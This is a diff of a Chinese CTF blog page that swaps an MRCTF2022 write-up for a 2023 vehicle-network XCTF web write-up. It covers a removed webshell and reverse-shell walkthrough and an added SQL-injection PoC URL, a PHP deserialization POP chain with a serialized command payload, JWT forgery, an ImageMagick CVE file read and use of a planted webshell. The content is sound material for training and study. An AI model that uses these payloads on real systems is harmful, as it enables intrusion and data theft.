@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Misc checkin 翻源码找到flag Web WebCheckIn 上传东西上去发现没有回显，然后试着传其他的文件上去，发现随手写的php文件上传上去了，返回了路径 然后就往里面加了一'>
-<title>[MRCTF2022] WP</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='饶派杯 web writeup Easy_sql crossall_act.php 的 execsql sql 注入老洞，提示说这个版本加密算法改了，但是service.php是混淆过的，无法直接读到里面的函数内容，但是自己调试可以'>
+<title>[2023饶派杯XCTF车联网挑战赛] WP</title>
 
-<link rel='canonical' href='https://blog.huamang.xyz/post/mrctf2022_wp/'>
+<link rel='canonical' href='https://blog.huamang.xyz/post/%E9%A5%B6%E6%B4%BE%E6%9D%AF/'>
 
-<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='[MRCTF2022] WP'>
-<meta property='og:description' content='Misc checkin 翻源码找到flag Web WebCheckIn 上传东西上去发现没有回显，然后试着传其他的文件上去，发现随手写的php文件上传上去了，返回了路径 然后就往里面加了一'>
-<meta property='og:url' content='https://blog.huamang.xyz/post/mrctf2022_wp/'>
+<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='[2023饶派杯XCTF车联网挑战赛] WP'>
+<meta property='og:description' content='饶派杯 web writeup Easy_sql crossall_act.php 的 execsql sql 注入老洞，提示说这个版本加密算法改了，但是service.php是混淆过的，无法直接读到里面的函数内容，但是自己调试可以'>
+<meta property='og:url' content='https://blog.huamang.xyz/post/%E9%A5%B6%E6%B4%BE%E6%9D%AF/'>
 <meta property='og:site_name' content='Huamang'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-25T18:01:47&#43;08:00'/><meta property='article:modified_time' content='2022-04-25T18:01:47&#43;08:00'/>
-<meta name="twitter:title" content="[MRCTF2022] WP">
-<meta name="twitter:description" content="Misc checkin 翻源码找到flag Web WebCheckIn 上传东西上去发现没有回显，然后试着传其他的文件上去，发现随手写的php文件上传上去了，返回了路径 然后就往里面加了一">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-06-01T18:12:37&#43;08:00'/><meta property='article:modified_time' content='2023-06-01T18:12:37&#43;08:00'/>
+<meta name="twitter:title" content="[2023饶派杯XCTF车联网挑战赛] WP">
+<meta name="twitter:description" content="饶派杯 web writeup Easy_sql crossall_act.php 的 execsql sql 注入老洞，提示说这个版本加密算法改了，但是service.php是混淆过的，无法直接读到里面的函数内容，但是自己调试可以">
     </head>
     <body class="
     article-page
@@ -284,24 +284,13 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li>
+    <li><a href="#饶派杯-web-writeup">饶派杯 web writeup</a>
       <ol>
-        <li><a href="#misc">Misc</a>
-          <ol>
-            <li><a href="#checkin">checkin</a></li>
-          </ol>
-        </li>
-        <li><a href="#web">Web</a>
-          <ol>
-            <li><a href="#webcheckin">WebCheckIn</a></li>
-          </ol>
-        </li>
-        <li><a href="#bonus">Bonus</a>
-          <ol>
-            <li><a href="#java_mem_shell_basic">Java_mem_shell_Basic</a></li>
-            <li><a href="#java_mem_shell_filter">Java_mem_shell_Filter</a></li>
-          </ol>
-        </li>
+        <li><a href="#easy_sql">Easy_sql</a></li>
+        <li><a href="#fileread">fileread</a></li>
+        <li><a href="#对脆弱的车辆性能管理系统">对脆弱的车辆性能管理系统</a></li>
+        <li><a href="#对访客开放的车载系统">对访客开放的车载系统</a></li>
+        <li><a href="#easy-cms">easy cms</a></li>
       </ol>
     </li>
   </ol>
@@ -331,7 +320,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/post/mrctf2022_wp/">[MRCTF2022] WP</a>
+            <a href="/post/%E9%A5%B6%E6%B4%BE%E6%9D%AF/">[2023饶派杯XCTF车联网挑战赛] WP</a>
         </h2>
     
         
@@ -353,7 +342,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Apr 25, 2022</time>
+                <time class="article-time--published">Jun 01, 2023</time>
             </div>
         
 
@@ -383,226 +372,375 @@
     <section class="article-content">
     
     
-    <h2 id="misc">Misc</h2>
-<h3 id="checkin">checkin</h3>
-<p>翻源码找到flag</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220423093224882.png"
+    <h1 id="饶派杯-web-writeup">饶派杯 web writeup</h1>
+<h2 id="easy_sql">Easy_sql</h2>
+<p>crossall_act.php 的 execsql sql 注入老洞，提示说这个版本加密算法改了，但是service.php是混淆过的，无法直接读到里面的函数内容，但是自己调试可以发现他解密是在execsql函数里执行的</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201441590.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220423093224882"
+		alt="image-20230601201441590"
 	
 	
 ></p>
-<h2 id="web">Web</h2>
-<h3 id="webcheckin">WebCheckIn</h3>
-<p>上传东西上去发现没有回显，然后试着传其他的文件上去，发现随手写的php文件上传上去了，返回了路径</p>
-<p>然后就往里面加了一句话木马进去了</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220423134056156.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20220423134056156"
-	
-	
-></p>
-<p>然后发现根目录没有flag</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220423134126222.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20220423134126222"
-	
-	
-></p>
-<p>而且只是www权限，猜测是不是要提权，看了一下php文件的权限就是root</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220423134226603.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20220423134226603"
-	
-	
-></p>
-<p>于是直接用php文件反弹shell，直接反弹shell不行，会报错，这里用的curl反弹shell</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220423134319048.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20220423134319048"
-	
-	
-></p>
-<p>进去直接find搜flag，成功拿到</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220423134401997.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20220423134401997"
-	
-	
-></p>
-<h2 id="bonus">Bonus</h2>
-<h3 id="java_mem_shell_basic">Java_mem_shell_Basic</h3>
-<p>打开是tomcat的默认页面，进入manage看看，弱口令tomcat:tomcat登录成功，进了manage就可以随便getshell了</p>
-<p>这里把冰蝎马打包一个war包，然后传上去拿到shell</p>
+<p>但是无所谓，我们可以直接调用加密算法，直接加密我们需要执行的sql语句</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">jar cvf hmnb.war shellmh.jsp
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">$data = service::lockString(&#34;select group_concat(table_name) from INFORMATION_SCHEMA.TABLES;&#34;);</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
-</div><p>然后连进冰蝎，而且给的直接就是root权限</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424074214197.png"
+</div><p>注出表名</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201509405.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424074214197"
+		alt="image-20230601201509405"
 	
 	
 ></p>
-<p>感觉冰蝎的终端不好用，反弹一个shell</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424074508620.png"
+<p>查flag</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201522582.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424074508620"
+		alt="image-20230601201522582"
 	
 	
 ></p>
-<p>直接find查找到flag</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424075140362.png"
+<p>最后poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">http://172.35.10.30/index.php?case=crossall&amp;act=execsql&amp;sql=8PYGg7D9glxF-MJ6j9%3DxP4GqDL5-t5jRR5Vy9N5-T7ThN2iJd2ab18391e6e61e99aff8e10d05e4ad02</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="fileread">fileread</h2>
+<p>php&lt;=7.4.21 development server源码泄露，似乎是做了一些配置，测试的时候发现不管访问 xx.php 或者 /xx 都是返回 200，但是 xx.zip 就是返回 404，然后用默认的 payload 也读不出来 index.php，最后发现构造 xx.zip 这种不存在的 path 可以读到源码</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201534602.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424075140362"
+		alt="image-20230601201534602"
 	
 	
 ></p>
-<h3 id="java_mem_shell_filter">Java_mem_shell_Filter</h3>
-<p>进入是一个登录页面</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424075502027.png"
+<p>反序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">&lt;?php</span><span class="w">
+</span><span class="w"></span><span class="l">ini_set(&#34;error_reporting&#34;,&#34;E_ALL &amp;amp; ~E_NOTICE&#34;);</span><span class="w">
+</span><span class="w"></span><span class="l">class A</span><span class="w">
+</span><span class="w"></span>{<span class="w">
+</span><span class="w">        </span><span class="l">public $func;</span><span class="w">
+</span><span class="w">        </span><span class="l">public $end2;</span><span class="w">
+</span><span class="w">        </span><span class="l">public function __wakeup()</span><span class="w">
+</span><span class="w">        </span>{<span class="w">
+</span><span class="w">                </span><span class="l">$this-&gt;end2=&#34;die&#34;;</span><span class="w">
+</span><span class="w">        </span>}<span class="w">
+</span><span class="w">        </span><span class="l">public function __call($method, $args)</span><span class="w">
+</span><span class="w">        </span>{<span class="w">
+</span><span class="w">                </span><span class="l">echo &#34;begin&#34;;</span><span class="w">
+</span><span class="w">        </span>}<span class="w">
+</span><span class="w">        </span><span class="l">public function __destruct()</span><span class="w">
+</span><span class="w">        </span>{<span class="w">
+</span><span class="w">                </span><span class="l">$this-&gt;func=&#34;system&#34;;</span><span class="w">
+</span><span class="w">                </span><span class="l">$waf=$this-&gt;end2;</span><span class="w">
+</span><span class="w">                </span><span class="l">$func=$this-&gt;func;</span><span class="w">
+</span><span class="w">                </span><span class="l">$waf();</span><span class="w">
+</span><span class="w">                </span><span class="l">$func($_GET[&#34;param&#34;]);</span><span class="w">
+</span><span class="w">        </span>}<span class="w">
+</span><span class="w"></span>}<span class="w">
+</span><span class="w"></span><span class="l">class B</span><span class="w">
+</span><span class="w"></span>{<span class="w">
+</span><span class="w">        </span><span class="l">public $poc;</span><span class="w">
+</span><span class="w">        </span><span class="l">public function __destruct()</span><span class="w">
+</span><span class="w">        </span>{<span class="w">
+</span><span class="w">                </span><span class="l">$this-&gt;poc-&gt;test();</span><span class="w">
+</span><span class="w">        </span>}<span class="w">
+</span><span class="w"></span>}<span class="w">
+</span><span class="w"></span><span class="l">$o=unserialize($_GET[&#34;poc&#34;]);</span><span class="w">
+</span><span class="w"></span><span class="p">?</span><span class="l">&gt;</span><span class="w">
+</span><span class="w">
+</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>pop链构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">&lt;?php</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">ini_set(&#34;error_reporting&#34;, &#34;E_ALL &amp;amp; ~E_NOTICE&#34;);</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">class A</span><span class="w">
+</span><span class="w"></span>{<span class="w">
+</span><span class="w">    </span><span class="l">public $func;</span><span class="w">
+</span><span class="w">    </span><span class="l">public $end2;</span><span class="w">
+</span><span class="w">
+</span><span class="w">    </span><span class="l">public function __construct(){</span><span class="w">
+</span><span class="w">        </span><span class="l">$this-&gt;func = &#34;system&#34;;</span><span class="w">
+</span><span class="w">        </span><span class="l">$this-&gt;end2 = &amp;$this-&gt;func;</span><span class="w">
+</span><span class="w">    </span>}<span class="w">
+</span><span class="w">    </span><span class="l">public function __wakeup()</span><span class="w">
+</span><span class="w">    </span>{<span class="w">
+</span><span class="w">        </span><span class="l">$this-&gt;end2 = &#34;die&#34;;</span><span class="w">
+</span><span class="w">    </span>}<span class="w">
+</span><span class="w">
+</span><span class="w">    </span><span class="l">public function __call($method, $args)</span><span class="w">
+</span><span class="w">    </span>{<span class="w">
+</span><span class="w">        </span><span class="l">echo &#34;begin&#34;;</span><span class="w">
+</span><span class="w">    </span>}<span class="w">
+</span><span class="w">
+</span><span class="w">    </span><span class="l">public function __destruct()</span><span class="w">
+</span><span class="w">    </span>{<span class="w">
+</span><span class="w">        </span><span class="l">$this-&gt;func = &#34;system&#34;;</span><span class="w">
+</span><span class="w">        </span><span class="l">$waf = $this-&gt;end2;</span><span class="w">
+</span><span class="w">        </span><span class="l">$func = $this-&gt;func;</span><span class="w">
+</span><span class="w">        </span><span class="l">$waf();</span><span class="w">
+</span><span class="w">        </span><span class="l">$func($_GET[&#34;param&#34;]);</span><span class="w">
+</span><span class="w">    </span>}<span class="w">
+</span><span class="w"></span>}<span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">class B</span><span class="w">
+</span><span class="w"></span>{<span class="w">
+</span><span class="w">    </span><span class="l">public $poc;</span><span class="w">
+</span><span class="w">
+</span><span class="w">    </span><span class="l">public function __construct(){</span><span class="w">
+</span><span class="w">        </span><span class="l">$this-&gt;poc = new A();</span><span class="w">
+</span><span class="w">    </span>}<span class="w">
+</span><span class="w">    </span><span class="l">public function __destruct()</span><span class="w">
+</span><span class="w">    </span>{<span class="w">
+</span><span class="w">        </span><span class="l">$this-&gt;poc-&gt;test();</span><span class="w">
+</span><span class="w">    </span>}<span class="w">
+</span><span class="w"></span>}<span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">$a = new B;</span><span class="w">
+</span><span class="w"></span><span class="l">echo serialize($a);</span><span class="w">
+</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">http://172.35.10.169/?poc=O:1:%22B%22:1:{s:3:%22poc%22;O:1:%22A%22:2:{s:4:%22func%22;s:6:%22system%22;s:4:%22end2%22;R:3;}}&amp;param=cat%20/flag</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="对脆弱的车辆性能管理系统">对脆弱的车辆性能管理系统</h2>
+<p>爆破出来 jwt 密钥是 ACE，id 参数是有盲注的，发现 select 被过滤了，双写绕，用脚本跑一下可以得到设计师的名字</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201546439.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424075502027"
+		alt="image-20230601201546439"
 	
 	
 ></p>
-<p>目录扫描没啥结果</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424080136132.png"
+<p>根据题目的信息可以得到主题，最后还有个 iat 时间参数需要构造，也是在题目给的信息里面，说工作时间是 996 ，4月3号生产出汽车，所以尝试了 4.1 和 4.2 两天的时间戳，最后改成 4.2 号的时间重新伪造 jwt 发包拿到车辆的敏感信息，也就是 flag</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201557032.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424080136132"
+		alt="image-20230601201557032"
 	
 	
 ></p>
-<p>尝试爆破一个账号密码，爆破了一大堆，找不到可用的</p>
-<p>尝试sql注入，试了很多，根本试不出报错，尝试跑一下sqlmap，还是无果</p>
-<p>后来发现是log4j。。。</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424092433941.png"
+<h2 id="对访客开放的车载系统">对访客开放的车载系统</h2>
+<p>hint 给了访客弱口令，Guest / Guest 进后台，只有一个头像上传点，又给了个 hint 是 imagemagic，大概率就是 CVE-2022-44268 了，直接上传 payload 读 flag 即可</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201607159.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424092433941"
+		alt="image-20230601201607159"
 	
 	
 ></p>
-<p>马上来打一波</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424095851667.png"
+<p>把图片下载回来解码得到 flag</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201618357.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424095851667"
+		alt="image-20230601201618357"
 	
 	
 ></p>
-<p>进去以后，发现web目录有一个godzilla，密码拿到了，密钥是默认的key</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424125343511.png"
+<h2 id="easy-cms">easy cms</h2>
+<p>信呼的未授权备份，不过目录最后四位是随机数，所以写个脚本并发一下，多生成点备份，提高爆破概率，最后得到备份文件目录</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201628316.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424125343511"
+		alt="image-20230601201628316"
 	
 	
 ></p>
-<p>连进哥斯拉里面</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424125415146.png"
+<p>然后继续爆破备份的 sql 了</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201641464.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424125415146"
+		alt="image-20230601201641464"
 	
 	
 ></p>
-<p>find没找到flag，结合题目名理解，可能是在filter内存马里面，这里用jmapdump出jvm内存</p>
-<p>首先查看pid： <code>ps -ef|grep java</code></p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424180756412.png"
+<p>里面拿到用户名 thisisadminoooajinjquiii 和密码 hash，查出来密码 asdasdqwezxc，后台有一个文件包含的老洞，不过只能包含 .php .shtml</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201650799.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424180756412"
+		alt="image-20230601201650799"
 	
 	
 ></p>
-<p>然后dump：<code>jmap -dump:format=b,file=e.bin 51</code></p>
-<p>然后下载出来</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220424175248636.png"
+<p>后面挖了很久的文件上传点也没有找到哪里能传 .php 的或者 .shtml 的，最后通过信呼后台的一个老洞 getdatssss 目录遍历发现原来在根目录给了一个 php 文件，flag 也在根目录</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201701971.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220424175248636"
+		alt="image-20230601201701971"
 	
 	
 ></p>
-<p>找到flag</p>
-<p><img src="https://tuchuang.huamang.xyz/img/image-20220425190844505.png"
+<p>包含一下这个文件，是一个 phpinfo，然后文件开头还有一个 1</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201713777.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20220425190844505"
+		alt="image-20230601201713777"
 	
 	
 ></p>
+<p>猜测是一个密码是 1 的一句话木马，测试发现是通过 get 传参，最后读 flag 即可</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230601201724364.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230601201724364"
+	
+	
+></p>
+<p>‍</p>
 
 </section>
 
@@ -636,19 +774,6 @@
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
-            
-                
-<article class="">
-    <a href="/post/%E9%A5%B6%E6%B4%BE%E6%9D%AF/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">[2023饶派杯XCTF车联网挑战赛] WP</h2>
-        </div>
-    </a>
-</article>
-
             
                 
 <article class="">
@@ -697,6 +822,19 @@
 
         <div class="article-details">
             <h2 class="article-title">[TyphoonCon CTF 2022] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ciscn2022_half/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2022] Semifinals</h2>
         </div>
     </a>
 </article>
